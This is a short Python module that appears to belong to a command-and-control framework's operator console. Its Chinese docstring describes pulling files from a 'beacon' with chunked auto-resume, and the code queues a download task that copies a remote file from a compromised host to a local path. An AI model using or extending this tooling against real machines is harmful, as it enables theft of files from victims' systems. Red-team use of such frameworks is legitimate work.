"""download — 从 beacon 拉取文件（分块自动续传）:
download <beacon_id> <remote_path> <local_path>
"""

from server.task_queue import Task


def run(disp, args):
    if len(args) < 3:
        return "[!] usage: download <beacon_id> <remote_path> <local_path>"
    bid, remote, local = args[0], args[1], args[2]
    try:
        task = disp.build_task("download", [remote, "0"])
    except ValueError as e:
        return f"[!] {e}"
    if task is None:
        return "[!] unknown module: download"
    task.result_processor = "download_parse"
    task.proc_arg = local
    return disp.push_task(bid, task)
